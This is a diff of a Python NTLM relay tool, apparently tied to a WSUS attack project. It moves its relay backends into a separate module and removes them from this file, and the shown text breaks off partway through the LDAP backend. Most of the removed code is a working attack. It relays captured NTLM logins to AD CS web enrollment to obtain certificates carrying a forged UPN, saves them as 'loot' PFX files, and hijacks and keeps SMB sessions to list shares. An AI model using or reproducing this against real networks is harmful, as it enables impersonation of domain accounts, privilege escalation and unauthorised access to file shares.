@@ -24,6 +24,12 @@ import termios
 
 from rich.console import Console # type: ignore
 
+from relay import (
+    HTTPNTLMRelayBackend,
+    SMBNTLMRelayBackend,
+    LDAPNTLMRelayBackend,
+)
+
 NTLMSSP_NEGOTIATE_UNICODE = 0x00000001
 NTLMSSP_REQUEST_TARGET = 0x00000004
 NTLMSSP_NEGOTIATE_NTLM = 0x00000200
@@ -48,23 +54,6 @@ NTLM_TYPE2_FLAGS = (
 
 NTLM_SESSION_TTL = 120
 
-ADCS_TEMPLATE_FIELDS = (
-    "OFFLINE",
-    "REALNAME",
-    "KEYSPEC",
-    "KEYFLAG",
-    "ENROLLFLAG",
-    "PRIVATEKEYFLAG",
-    "SUBJECTFLAG",
-    "RASIGNATURE",
-    "CSPLIST",
-    "EXTOID",
-    "EXTMAJ",
-    "EXTFMIN",
-    "EXTMIN",
-    "FRIENDLYNAME",
-)
-ADCS_UPN_OID = "1.3.6.1.4.1.311.20.2.3"
 
 
 def _secbuf(length, offset):
@@ -249,1442 +238,6 @@ def _format_ntlm_capture(parsed, challenge):
         "client_blob": "",
     }
 
-
-class HTTPNTLMRelayBackend:
-    def __init__(
-        self,
-        target_url,
-        timeout=10,
-        action="auth-only",
-        adcs_markers=None,
-        adcs_template=None,
-        adcs_alt_name=None,
-        adcs_loot_dir="loot",
-    ):
-        self.target_url = target_url
-        self.timeout = timeout
-        self.action = action
-        self.adcs_template = adcs_template
-        self.adcs_alt_name = adcs_alt_name
-        self.adcs_loot_dir = adcs_loot_dir
-        self.adcs_markers = [
-            marker.strip()
-            for marker in (adcs_markers or [])
-            if marker and marker.strip()
-        ]
-        self.adcs_issued = set()
-        self.sessions = {}
-        self.lock = threading.RLock()
-
-        parsed = urlparse(target_url)
-        if parsed.scheme not in ("http", "https") or not parsed.hostname:
-            raise ValueError("relay target must be http:// or https://")
-
-        self.scheme = parsed.scheme
-        self.host = parsed.hostname
-        default_port = 443 if parsed.scheme == "https" else 80
-        self.port = parsed.port or default_port
-        host_header = self.host
-        if ":" in host_header and not host_header.startswith("["):
-            host_header = f"[{host_header}]"
-        self.host_header = (
-            host_header if self.port == default_port else f"{host_header}:{self.port}"
-        )
-        self.path = parsed.path or "/"
-        if parsed.query:
-            self.path += "?" + parsed.query
-
-    def _new_connection(self):
-        if self.scheme == "https":
-            ctx = ssl.create_default_context()
-            return http.client.HTTPSConnection(
-                self.host,
-                self.port,
-                timeout=self.timeout,
-                context=ctx,
-            )
-
-        return http.client.HTTPConnection(
-            self.host,
-            self.port,
-            timeout=self.timeout,
-        )
-
-    def _extract_ntlm_token(self, response):
-        headers = response.getheaders()
-
-        for name, value in headers:
-            if name.lower() != "www-authenticate":
-                continue
-
-            parts = [part.strip() for part in value.split(",")]
-            for part in parts:
-                if part.lower().startswith("ntlm "):
-                    return part.split(" ", 1)[1]
-
-        return None
-
-    def _headers_dict(self, response):
-        headers = {}
-        for name, value in response.getheaders():
-            key = name.lower()
-            if key in headers:
-                headers[key] = f"{headers[key]}, {value}"
-            else:
-                headers[key] = value
-        return headers
-
-    def _read_response_body(self, response, max_hint=4096):
-        content_length = response.getheader("Content-Length")
-        transfer_encoding = response.getheader("Transfer-Encoding", "")
-
-        if content_length is not None or "chunked" in transfer_encoding.lower():
-            body = response.read()
-            return body[:max_hint], len(body), True
-
-        body = response.read(max_hint)
-        return body, len(body), False
-
-    def _result_from_response(self, response, body, body_len, prefix=""):
-        headers = self._headers_dict(response)
-        key = f"{prefix}_" if prefix else ""
-
-        return {
-            f"{key}status": response.status,
-            f"{key}reason": response.reason,
-            f"{key}body_len": body_len,
-            f"{key}server": headers.get("server", ""),
-            f"{key}content_type": headers.get("content-type", ""),
-            f"{key}location": headers.get("location", ""),
-            f"{key}set_cookie": headers.get("set-cookie", ""),
-            f"{key}www_authenticate": headers.get("www-authenticate", ""),
-            f"{key}body_hint": body[:200].decode("latin-1", errors="replace"),
-        }
-
-    def _write_debug_body(self, label, body):
-        if not self.adcs_loot_dir:
-            return ""
-
-        try:
-            os.makedirs(self.adcs_loot_dir, exist_ok=True)
-            stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
-            path = os.path.join(self.adcs_loot_dir, f"{stamp}-{label}.html")
-            with open(path, "wb") as fh:
-                fh.write(body)
-            return path
-        except OSError:
-            return ""
-
-    def _adcs_base_path(self):
-        path = self.path.split("?", 1)[0]
-        certsrv_index = path.lower().find("/certsrv")
-        if certsrv_index == -1:
-            return ""
-
-        return path[: certsrv_index + len("/certsrv")].rstrip("/")
-
-    def _adcs_path(self, leaf):
-        base = self._adcs_base_path()
-        if not base:
-            return self.path
-        return f"{base}/{leaf.lstrip('/')}"
-
-    def _adcs_probe_path(self):
-        return self._adcs_path("certrqxt.asp")
-
-    def _parse_adcs_template_options(self, body_text):
-        templates = []
-        option_values = re.findall(
-            r"<option\s+value=\"(.*?)\"",
-            body_text,
-            flags=re.IGNORECASE,
-        )
-
-        for raw_value in option_values:
-            parts = html.unescape(raw_value).split(";")
-            template = {}
-            for index, value in enumerate(parts):
-                key = (
-                    ADCS_TEMPLATE_FIELDS[index]
-                    if index < len(ADCS_TEMPLATE_FIELDS)
-                    else f"UNKNOWN_{index}"
-                )
-                template[key] = value
-            templates.append(template)
-
-        return templates
-
-    def _authenticated_followup(self, conn, path=None, connection="close"):
-        followup_path = path or self.path
-        conn.request(
-            "GET",
-            followup_path,
-            headers={
-                "Host": self.host_header,
-                "Connection": connection,
-                "User-Agent": "pywsus-ntlm-relay",
-            },
-        )
-        res = conn.getresponse()
-        body, body_len, body_drained = self._read_response_body(res)
-        result = self._result_from_response(res, body, body_len, "followup")
-        result["followup_path"] = followup_path
-        result["followup_body_drained"] = body_drained
-        result["followup_will_close"] = getattr(res, "will_close", False)
-        result["followup_authenticated"] = self._looks_authenticated(
-            {
-                "status": result["followup_status"],
-                "www_authenticate": result["followup_www_authenticate"],
-            }
-        )
-        return result, body
-
-    def _load_adcs_crypto(self):
-        try:
-            from cryptography import x509  # type: ignore
-            from cryptography.hazmat.primitives import hashes  # type: ignore
-            from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore
-            from cryptography.hazmat.primitives.serialization import (  # type: ignore
-                Encoding,
-                NoEncryption,
-                pkcs12,
-            )
-            from cryptography.x509 import (  # type: ignore
-                load_der_x509_certificate,
-                load_pem_x509_certificate,
-            )
-            from cryptography.x509.oid import (  # type: ignore
-                NameOID,
-                ObjectIdentifier,
-            )
-        except ImportError as err:
-            raise RuntimeError("AD CS issuance requires cryptography") from err
-
-        return {
-            "Encoding": Encoding,
-            "NameOID": NameOID,
-            "NoEncryption": NoEncryption,
-            "ObjectIdentifier": ObjectIdentifier,
-            "hashes": hashes,
-            "load_der_x509_certificate": load_der_x509_certificate,
-            "load_pem_x509_certificate": load_pem_x509_certificate,
-            "pkcs12": pkcs12,
-            "rsa": rsa,
-            "x509": x509,
-        }
-
-    @staticmethod
-    def _der_length(length):
-        if length < 0x80:
-            return bytes([length])
-
-        length_bytes = length.to_bytes((length.bit_length() + 7) // 8, "big")
-        return bytes([0x80 | len(length_bytes)]) + length_bytes
-
-    @classmethod
-    def _der_utf8_string(cls, value):
-        raw = value.encode("utf-8")
-        return b"\x0c" + cls._der_length(len(raw)) + raw
-
-    def _adcs_generate_key_and_csr(self, crypto, common_name, alt_name):
-        key = crypto["rsa"].generate_private_key(
-            public_exponent=65537,
-            key_size=4096,
-        )
-
-        builder = crypto["x509"].CertificateSigningRequestBuilder()
-        if common_name:
-            builder = builder.subject_name(
-                crypto["x509"].Name([
-                    crypto["x509"].NameAttribute(
-                        crypto["NameOID"].COMMON_NAME,
-                        common_name,
-                    )
-                ])
-            )
-
-        if alt_name:
-            builder = builder.add_extension(
-                crypto["x509"].SubjectAlternativeName([
-                    crypto["x509"].OtherName(
-                        crypto["ObjectIdentifier"](ADCS_UPN_OID),
-                        self._der_utf8_string(alt_name),
-                    )
-                ]),
-                critical=False,
-            )
-
-        csr = builder.sign(key, crypto["hashes"].SHA256())
-        return key, csr.public_bytes(crypto["Encoding"].PEM)
-
-    @staticmethod
-    def _adcs_generate_pfx(crypto, key, certificate):
-        return crypto["pkcs12"].serialize_key_and_certificates(
-            name=b"",
-            key=key,
-            cert=certificate,
-            cas=None,
-            encryption_algorithm=crypto["NoEncryption"](),
-        )
-
-    @staticmethod
-    def _adcs_load_certificate(crypto, raw_certificate):
-        try:
-            return crypto["load_pem_x509_certificate"](raw_certificate)
-        except Exception:
-            return crypto["load_der_x509_certificate"](raw_certificate)
-
-    @staticmethod
-    def _adcs_cert_attributes(template, alt_name):
-        if alt_name:
-            return f"CertificateTemplate:{template}%0d%0aSAN:upn={alt_name}"
-        return f"CertificateTemplate:{template}"
-
-    @staticmethod
-    def _sanitize_filename(name):
-        sanitized = re.sub(r"[^A-Za-z0-9._-]", "_", name or "")
-        sanitized = sanitized.strip("._")
-        return sanitized or "certificate"
-
-    def _adcs_identity_key(self, identity, username):
-        return (identity or username or "").lower()
-
-    def _adcs_template_for(self, username):
-        if self.adcs_template:
-            return self.adcs_template
-        return "Machine" if (username or "").endswith("$") else "User"
-
-    def _extract_adcs_request_id(self, body):
-        body_text = body.decode("latin-1", errors="replace")
-        found = re.findall(r'location="certnew\.cer\?ReqID=(.*?)&', body_text)
-        if found:
-            return html.unescape(found[0])
-
-        found = re.findall(r"certnew\.cer\?ReqID=([^&\"'>\s]+)", body_text)
-        if found:
-            return html.unescape(found[0])
-
-        return ""
-
-    def _issue_adcs_certificate(self, conn, identity, username):
-        issue_key = self._adcs_identity_key(identity, username)
-        with self.lock:
-            if issue_key and issue_key in self.adcs_issued:
-                return {
-                    "adcs_issue_attempted": False,
-                    "adcs_issued": False,
-                    "adcs_issue_state": "skipped-duplicate",
-                }
-
-        template = self._adcs_template_for(username)
-        quoted_template = quote(template)
-        result = {
-            "adcs_issue_attempted": True,
-            "adcs_issued": False,
-            "adcs_issue_state": "started",
-            "adcs_template": template,
-            "adcs_alt_name": self.adcs_alt_name or "",
-            "adcs_loot_dir": self.adcs_loot_dir,
-        }
-
-        crypto = self._load_adcs_crypto()
-        common_name = username or identity
-        key, csr = self._adcs_generate_key_and_csr(
-            crypto,
-            common_name,
-            self.adcs_alt_name,
-        )
-        encoded_csr = (
-            csr.decode()
-            .replace("\n", "")
-            .replace("+", "%2b")
-            .replace(" ", "+")
-        )
-        cert_attrib = self._adcs_cert_attributes(
-            quoted_template,
-            self.adcs_alt_name,
-        )
-        data = (
-            "Mode=newreq&CertRequest=%s&CertAttrib=%s&"
-            "TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
-        ) % (encoded_csr, cert_attrib)
-        data_bytes = data.encode("utf-8")
-
-        submit_path = self._adcs_path("certfnsh.asp")
-        conn.request(
-            "POST",
-            submit_path,
-            body=data_bytes,
-            headers={
-                "Host": self.host_header,
-                "Connection": "keep-alive",
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Content-Length": str(len(data_bytes)),
-            },
-        )
-        submit_res = conn.getresponse()
-        submit_body, submit_body_len, submit_drained = self._read_response_body(
-            submit_res,
-            max_hint=65536,
-        )
-        result.update(
-            self._result_from_response(
-                submit_res,
-                submit_body,
-                submit_body_len,
-                "adcs_submit",
-            )
-        )
-
-        if submit_res.status != 200:
-            result["adcs_issue_state"] = "submit-failed"
-            result["adcs_issue_error"] = f"submit HTTP {submit_res.status}"
-            debug_path = self._write_debug_body("adcs-submit-failed", submit_body)
-            if debug_path:
-                result["adcs_debug_path"] = debug_path
-            return result
-
-        request_id = self._extract_adcs_request_id(submit_body)
-        if not request_id:
-            result["adcs_issue_state"] = "request-id-missing"
-            result["adcs_issue_error"] = "certificate request ID not found"
-            debug_path = self._write_debug_body("adcs-submit-no-reqid", submit_body)
-            if debug_path:
-                result["adcs_debug_path"] = debug_path
-            return result
-
-        result["adcs_certificate_id"] = request_id
-
-        if not submit_drained or getattr(submit_res, "will_close", False):
-            result["adcs_issue_state"] = "certificate-fetch-skipped"
-            result["adcs_issue_error"] = "target closed before certificate fetch"
-            return result
-
-        cert_path = self._adcs_path(f"certnew.cer?ReqID={request_id}")
-        conn.request(
-            "GET",
-            cert_path,
-            headers={
-                "Host": self.host_header,
-                "Connection": "close",
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-            },
-        )
-        cert_res = conn.getresponse()
-        cert_body, cert_body_len, _ = self._read_response_body(
-            cert_res,
-            max_hint=262144,
-        )
-        result.update(
-            self._result_from_response(
-                cert_res,
-                cert_body,
-                cert_body_len,
-                "adcs_cert",
-            )
-        )
-
-        if cert_res.status != 200:
-            result["adcs_issue_state"] = "certificate-fetch-failed"
-            result["adcs_issue_error"] = f"certificate HTTP {cert_res.status}"
-            debug_path = self._write_debug_body("adcs-cert-fetch-failed", cert_body)
-            if debug_path:
-                result["adcs_debug_path"] = debug_path
-            return result
-
-        try:
-            cert_obj = self._adcs_load_certificate(crypto, cert_body)
-        except Exception as err:
-            result["adcs_issue_state"] = "certificate-parse-failed"
-            result["adcs_issue_error"] = str(err)
-            debug_path = self._write_debug_body("adcs-cert-parse-failed", cert_body)
-            if debug_path:
-                result["adcs_debug_path"] = debug_path
-            return result
-
-        pfx_data = self._adcs_generate_pfx(crypto, key, cert_obj)
-        os.makedirs(self.adcs_loot_dir, exist_ok=True)
-        pfx_name = self._sanitize_filename(identity or username)
-        pfx_path = os.path.join(self.adcs_loot_dir, f"{pfx_name}.pfx")
-        with open(pfx_path, "wb") as fh:
-            fh.write(pfx_data)
-
-        with self.lock:
-            if issue_key:
-                self.adcs_issued.add(issue_key)
-
-        result.update({
-            "adcs_issued": True,
-            "adcs_issue_state": "issued",
-            "adcs_pfx_path": pfx_path,
-            "adcs_pfx_size": len(pfx_data),
-        })
-        return result
-
-    def start_type1(self, session_key, type1_token):
-        conn = self._new_connection()
-
-        try:
-            with self.lock:
-                old_session = self.sessions.pop(session_key, None)
-            if old_session:
-                old_session["conn"].close()
-
-            # Some HTTP NTLM targets expect a first unauthenticated request.
-            conn.request(
-                "GET",
-                self.path,
-                headers={
-                    "Host": self.host_header,
-                    "Connection": "keep-alive",
-                    "User-Agent": "pywsus-ntlm-relay",
-                },
-            )
-            res = conn.getresponse()
-            res.read()
-
-            conn.request(
-                "GET",
-                self.path,
-                headers={
-                    "Host": self.host_header,
-                    "Connection": "keep-alive",
-                    "User-Agent": "pywsus-ntlm-relay",
-                    "Authorization": f"NTLM {type1_token}",
-                },
-            )
-            res = conn.getresponse()
-            body = res.read()
-
-            type2 = self._extract_ntlm_token(res)
-            if not type2:
-                raise RuntimeError(
-                    f"target did not return NTLM Type 2. "
-                    f"status={res.status} reason={res.reason} body_len={len(body)}"
-                )
-            if getattr(res, "will_close", False):
-                raise RuntimeError(
-                    f"target returned NTLM Type 2 but closed the connection. "
-                    f"status={res.status} reason={res.reason}"
-                )
-
-            with self.lock:
-                self.sessions[session_key] = {
-                    "conn": conn,
-                    "target_status_type2": res.status,
-                    "created_at": time.time(),
-                }
-
-            return type2
-        except Exception:
-            conn.close()
-            raise
-
-    def finish_type3(self, session_key, type3_token, identity="", username=""):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if not session:
-            raise RuntimeError("missing relay session for Type 3")
-
-        conn = session["conn"]
-
-        try:
-            conn.request(
-                "GET",
-                self.path,
-                headers={
-                    "Host": self.host_header,
-                    "Connection": "keep-alive",
-                    "User-Agent": "pywsus-ntlm-relay",
-                    "Authorization": f"NTLM {type3_token}",
-                },
-            )
-            res = conn.getresponse()
-            body, body_len, body_drained = self._read_response_body(res)
-            result = self._result_from_response(res, body, body_len)
-            result.update({
-                "authenticated": False,
-                "type3_accepted": False,
-                "followup_attempted": False,
-                "followup_authenticated": None,
-                "followup_state": "not-run",
-                "auth_validation": "rejected",
-                "action": self.action,
-                "target_status_type2": session.get("target_status_type2"),
-            })
-            service_body = body
-
-            result["type3_accepted"] = self._looks_authenticated(result)
-
-            if result["type3_accepted"]:
-                if body_drained and not getattr(res, "will_close", False):
-                    result["followup_attempted"] = True
-                    followup_path = (
-                        self._adcs_probe_path()
-                        if self.action in ("adcs-certsrv", "adcs-issue")
-                        else self.path
-                    )
-                    followup_connection = (
-                        "keep-alive" if self.action == "adcs-issue" else "close"
-                    )
-                    try:
-                        followup, followup_body = self._authenticated_followup(
-                            conn,
-                            followup_path,
-                            connection=followup_connection,
-                        )
-                        result.update(followup)
-                        if result.get("followup_authenticated") is True:
-                            service_body = followup_body
-                    except Exception as err:
-                        result["followup_error"] = str(err)
-                        result["followup_state"] = "error"
-
-                if result.get("followup_authenticated") is True:
-                    result["authenticated"] = True
-                    result["followup_state"] = "accepted"
-                    result["auth_validation"] = "type3-and-followup"
-                elif result.get("followup_authenticated") is False:
-                    result["authenticated"] = False
-                    result["followup_state"] = "rejected"
-                    result["auth_validation"] = "followup-rejected"
-                else:
-                    result["authenticated"] = True
-                    result["auth_validation"] = "type3-only"
-
-            if self.action in ("adcs-certsrv", "adcs-issue"):
-                result.update(self._evaluate_adcs_certsrv(service_body, result))
-                if self.action == "adcs-issue":
-                    can_issue = (
-                        result["authenticated"]
-                        and result["service_validated"]
-                        and result.get("followup_body_drained") is True
-                        and not result.get("followup_will_close", True)
-                    )
-                    if can_issue:
-                        try:
-                            issue_result = self._issue_adcs_certificate(
-                                conn,
-                                identity,
-                                username,
-                            )
-                            result.update(issue_result)
-                        except Exception as err:
-                            result.update({
-                                "adcs_issue_attempted": True,
-                                "adcs_issued": False,
-                                "adcs_issue_state": "error",
-                                "adcs_issue_error": str(err),
-                            })
-                    else:
-                        issue_state = "skipped-validation-failed"
-                        if result["authenticated"] and result["service_validated"]:
-                            issue_state = "skipped-connection-not-reusable"
-                        result.update({
-                            "adcs_issue_attempted": False,
-                            "adcs_issued": False,
-                            "adcs_issue_state": issue_state,
-                        })
-            else:
-                result.update({
-                    "service": "generic-http",
-                    "service_validated": result["authenticated"],
-                    "evidence": [],
-                })
-
-            return result
-        finally:
-            conn.close()
-
-    def _looks_authenticated(self, result):
-        return (
-            result["status"] not in (401, 403)
-            and "ntlm" not in result.get("www_authenticate", "").lower()
-        )
-
-    def _evaluate_adcs_certsrv(self, body, result):
-        body_text = body.decode("latin-1", errors="replace")
-        body_lower = body_text.lower()
-        evidence = []
-        score = 0
-        marker_found = False
-        custom_marker_found = False
-
-        if self.path.rstrip("/").lower().endswith("/certsrv"):
-            evidence.append("target_path=/certsrv/")
-            score += 1
-
-        followup_path = result.get("followup_path", "")
-        if followup_path.split("?", 1)[0].rstrip("/").lower().endswith(
-            "/certsrv/certrqxt.asp"
-        ):
-            evidence.append("probe_path=/certsrv/certrqxt.asp")
-            score += 2
-
-        templates = self._parse_adcs_template_options(body_text)
-        if templates:
-            evidence.append(f"body:template_options={len(templates)}")
-            score += 4
-            marker_found = True
-
-        strong_markers = {
-            "microsoft active directory certificate services": (
-                "body:microsoft active directory certificate services",
-                4,
-            ),
-            "active directory certificate services": (
-                "body:active directory certificate services",
-                4,
-            ),
-            "certificate services": ("body:certificate services", 3),
-            "certfnsh.asp": ("body:certfnsh.asp", 3),
-            "certrqma.asp": ("body:certrqma.asp", 3),
-            "certrqxt.asp": ("body:certrqxt.asp", 3),
-            "certcarc.asp": ("body:certcarc.asp", 3),
-            "certckpn.asp": ("body:certckpn.asp", 3),
-            "certnew.cer": ("body:certnew.cer", 3),
-            "certnew.p7b": ("body:certnew.p7b", 3),
-        }
-        weak_markers = {
-            "certsrv": ("body:certsrv", 1),
-            "/certsrv/": ("body:/certsrv/", 1),
-            "certificate authority": ("body:certificate authority", 2),
-            "request a certificate": ("body:request a certificate", 2),
-            "download a ca certificate": ("body:download a ca certificate", 2),
-        }
-
-        for marker in self.adcs_markers:
-            if marker.lower() in body_lower:
-                evidence.append(f"custom_marker:{marker}")
-                score += 4
-                marker_found = True
-                custom_marker_found = True
-
-        for marker, (label, weight) in strong_markers.items():
-            if marker in body_lower:
-                evidence.append(label)
-                score += weight
-                marker_found = True
-
-        for marker, (label, weight) in weak_markers.items():
-            if marker in body_lower:
-                evidence.append(label)
-                score += weight
-
-        content_type_key = (
-            "followup_content_type"
-            if result.get("followup_authenticated") is True
-            else "content_type"
-        )
-        content_type = result.get(content_type_key, "").lower()
-        if "html" in content_type:
-            evidence.append(f"{content_type_key}={result[content_type_key]}")
-            score += 1
-
-        server_key = (
-            "followup_server"
-            if result.get("followup_authenticated") is True
-            else "server"
-        )
-        server = result.get(server_key, "").lower()
-        if "iis" in server or "microsoft" in server:
-            evidence.append(f"{server_key}={result[server_key]}")
-            score += 1
-
-        return {
-            "service": "adcs-web-enrollment",
-            "service_validated": result["authenticated"] and marker_found,
-            "adcs_score": score,
-            "adcs_marker_found": marker_found,
-            "adcs_custom_marker_found": custom_marker_found,
-            "adcs_template_count": len(templates),
-            "adcs_templates": templates,
-            "evidence": evidence,
-        }
-
-    def drop_session(self, session_key):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if session:
-            session["conn"].close()
-
-    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
-        now = time.time()
-        with self.lock:
-            stale = [
-                key for key, session in self.sessions.items()
-                if now - session.get("created_at", now) > max_age
-            ]
-            sessions = [self.sessions.pop(key) for key in stale]
-
-        for session in sessions:
-            session["conn"].close()
-
-        return len(sessions)
-
-
-class _SMBRelayConfig:
-    """Tiny ntlmrelayx-compatible config object for SMBRelayClient."""
-
-    smb2support = True
-    remove_mic = False
-    remove_target = False
-    domainIp = None
-    machineAccount = None
-    machineHashes = None
-
-
-class SMBNTLMRelayBackend:
-    def __init__(self, target_url, timeout=10, action="auth-only"):
-        self.target_url = target_url
-        self.timeout = timeout
-        self.action = action
-        self.sessions = {}
-        self.live_sessions = {}
-        self.next_live_session_id = 1
-        self.lock = threading.RLock()
-
-        parsed = urlparse(target_url)
-        if parsed.scheme != "smb" or not parsed.hostname:
-            raise ValueError("SMB relay target must be smb://host[:port]/")
-
-        self.target = parsed
-        self.host = parsed.hostname
-        self.port = parsed.port or 445
-
-    def _load_impacket(self):
-        try:
-            from impacket.examples.ntlmrelayx.clients.smbrelayclient import (  # type: ignore
-                SMBRelayClient,
-            )
-            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
-        except ImportError as err:
-            raise RuntimeError("SMB relay requires impacket") from err
-
-        return SMBRelayClient, ERROR_MESSAGES, STATUS_SUCCESS
-
-    @staticmethod
-    def _decode_token(token):
-        return base64.b64decode(token)
-
-    @staticmethod
-    def _status_name(error_messages, status):
-        name, _ = error_messages.get(status, ("UNKNOWN", ""))
-        return name
-
-    @staticmethod
-    def _clean_smb_text(value):
-        if isinstance(value, bytes):
-            value = value.decode("utf-8", errors="replace")
-        return str(value).rstrip("\x00")
-
-    def _session_info(self, client):
-        session = client.session
-        info = {
-            "smb_target": f"{self.host}:{self.port}",
-            "smb_dialect": "",
-            "smb_signing_required": None,
-            "smb_server_name": "",
-            "smb_server_domain": "",
-            "smb_server_os": "",
-            "smb_guest": None,
-        }
-
-        if not session:
-            return info
-
-        getters = {
-            "smb_dialect": session.getDialect,
-            "smb_signing_required": session.isSigningRequired,
-            "smb_server_name": session.getServerName,
-            "smb_server_domain": session.getServerDomain,
-            "smb_server_os": session.getServerOS,
-            "smb_guest": session.isGuestSession,
-        }
-        for key, getter in getters.items():
-            try:
-                info[key] = getter()
-            except Exception:
-                pass
-
-        return info
-
-    def _list_shares(self, client):
-        shares = []
-        for share in client.session.listShares():
-            shares.append({
-                "name": self._clean_smb_text(share["shi1_netname"]),
-                "remark": self._clean_smb_text(share["shi1_remark"]),
-            })
-        return shares
-
-    def _keep_live_session(self, client, identity, username, result):
-        with self.lock:
-            session_id = self.next_live_session_id
-            self.next_live_session_id += 1
-            self.live_sessions[session_id] = {
-                "client": client,
-                "identity": identity,
-                "username": username,
-                "created_at": time.time(),
-                "last_used": time.time(),
-                "info": dict(result),
-            }
-        return session_id
-
-    def list_live_sessions(self):
-        with self.lock:
-            records = []
-            for session_id, record in sorted(self.live_sessions.items()):
-                info = dict(record.get("info", {}))
-                records.append({
-                    "id": session_id,
-                    "identity": record.get("identity", ""),
-                    "username": record.get("username", ""),
-                    "age": int(time.time() - record.get("created_at", time.time())),
-                    "idle": int(time.time() - record.get("last_used", time.time())),
-                    "target": info.get("smb_target", f"{self.host}:{self.port}"),
-                    "server": info.get("smb_server_name", ""),
-                    "domain": info.get("smb_server_domain", ""),
-                    "signing_required": info.get("smb_signing_required"),
-                })
-            return records
-
-    def list_live_session_shares(self):
-        with self.lock:
-            sessions = list(self.live_sessions.items())
-
-        results = []
-        for session_id, record in sessions:
-            try:
-                shares = self._list_shares(record["client"])
-                state = "shares-listed"
-                error = ""
-                with self.lock:
-                    if session_id in self.live_sessions:
-                        self.live_sessions[session_id]["last_used"] = time.time()
-            except Exception as err:
-                shares = []
-                state = "list-shares-failed"
-                error = str(err)
-
-            results.append({
-                "id": session_id,
-                "identity": record.get("identity", ""),
-                "shares": shares,
-                "share_count": len(shares),
-                "state": state,
-                "error": error,
-            })
-
-        return results
-
-    def close_live_sessions(self):
-        with self.lock:
-            sessions = list(self.live_sessions.values())
-            self.live_sessions = {}
-
-        for record in sessions:
-            try:
-                record["client"].killConnection()
-            except Exception:
-                pass
-
-        return len(sessions)
-
-    def start_type1(self, session_key, type1_token):
-        SMBRelayClient, _, _ = self._load_impacket()
-        client = SMBRelayClient(_SMBRelayConfig(), self.target, self.port)
-
-        try:
-            with self.lock:
-                old_session = self.sessions.pop(session_key, None)
-            if old_session:
-                old_session["client"].killConnection()
-
-            if not client.initConnection():
-                raise RuntimeError("SMB target connection failed")
-
-            challenge = client.sendNegotiate(self._decode_token(type1_token))
-            if not challenge:
-                raise RuntimeError("SMB target did not return NTLM Type 2")
-
-            challenge_data = challenge.getData()
-            with self.lock:
-                self.sessions[session_key] = {
-                    "client": client,
-                    "created_at": time.time(),
-                    "target_status_type2": "STATUS_MORE_PROCESSING_REQUIRED",
-                    "session_info": self._session_info(client),
-                }
-
-            return base64.b64encode(challenge_data).decode("ascii")
-        except Exception:
-            client.killConnection()
-            raise
-
-    def finish_type3(self, session_key, type3_token, identity="", username=""):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if not session:
-            raise RuntimeError("missing relay session for Type 3")
-
-        client = session["client"]
-        _, error_messages, status_success = self._load_impacket()
-        keep_client = False
-
-        try:
-            _, status = client.sendAuth(self._decode_token(type3_token))
-            status_name = self._status_name(error_messages, status)
-            authenticated = status == status_success
-            result = {
-                "status": status,
-                "reason": status_name,
-                "authenticated": authenticated,
-                "type3_accepted": authenticated,
-                "auth_validation": "smb-session-setup" if authenticated else "rejected",
-                "action": self.action,
-                "target_status_type2": session.get("target_status_type2"),
-                "service": "smb",
-                "service_validated": authenticated,
-                "identity": identity,
-                "username": username,
-                "shares": [],
-                "share_count": 0,
-                "smb_action_state": "not-run",
-                "smb_action_error": "",
-                "smb_session_id": "",
-                "smb_session_kept": False,
-                **session.get("session_info", {}),
-            }
-
-            if authenticated:
-                client.setClientId()
-                result.update(self._session_info(client))
-
-                if self.action == "keep-session":
-                    session_id = self._keep_live_session(
-                        client,
-                        identity,
-                        username,
-                        result,
-                    )
-                    keep_client = True
-                    result.update({
-                        "smb_session_id": session_id,
-                        "smb_session_kept": True,
-                        "smb_action_state": "session-kept",
-                    })
-                elif self.action == "list-shares":
-                    try:
-                        shares = self._list_shares(client)
-                        result.update({
-                            "shares": shares,
-                            "share_count": len(shares),
-                            "smb_action_state": "shares-listed",
-                        })
-                    except Exception as err:
-                        result.update({
-                            "smb_action_state": "list-shares-failed",
-                            "smb_action_error": str(err),
-                        })
-                else:
-                    result["smb_action_state"] = "auth-only"
-
-            return result
-        finally:
-            if not keep_client:
-                client.killConnection()
-
-    def drop_session(self, session_key):
-        with self.lock:
-            session = self.sessions.pop(session_key, None)
-        if session:
-            session["client"].killConnection()
-
-    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
-        now = time.time()
-        with self.lock:
-            stale = [
-                key for key, session in self.sessions.items()
-                if now - session.get("created_at", now) > max_age
-            ]
-            sessions = [self.sessions.pop(key) for key in stale]
-
-        for session in sessions:
-            session["client"].killConnection()
-
-        return len(sessions)
-
-
-class _LDAPRelayConfig:
-    """Small ntlmrelayx-compatible config object for LDAP relay clients."""
-
-    remove_mic = False
-    remove_sign_seal = False
-
-
-class LDAPNTLMRelayBackend:
-    ROOTDSE_ATTRIBUTES = (
-        "defaultNamingContext",
-        "dnsHostName",
-        "namingContexts",
-        "supportedLDAPVersion",
-        "supportedSASLMechanisms",
-        "vendorName",
-    )
-
-    def __init__(self, target_url, timeout=10, action="auth-only"):
-        self.target_url = target_url
-        self.timeout = timeout
-        self.action = action
-        self.sessions = {}
-        self.lock = threading.RLock()
-
-        parsed = urlparse(target_url)
-        if parsed.scheme not in ("ldap", "ldaps") or not parsed.hostname:
-            raise ValueError("LDAP relay target must be ldap:// or ldaps://")
-
-        self.target = parsed
-        self.scheme = parsed.scheme
-        self.host = parsed.hostname
-        self.port = parsed.port or (636 if parsed.scheme == "ldaps" else 389)
-
-    def _load_impacket(self):
-        try:
-            from impacket.examples.ntlmrelayx.clients.ldaprelayclient import (  # type: ignore
-                LDAPRelayClient,
-                LDAPRelayClientException,
-                LDAPSRelayClient,
-            )
-            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
-            from ldap3 import BASE  # type: ignore
-        except ImportError as err:
-            raise RuntimeError("LDAP relay requires impacket and ldap3") from err
-
-        return (
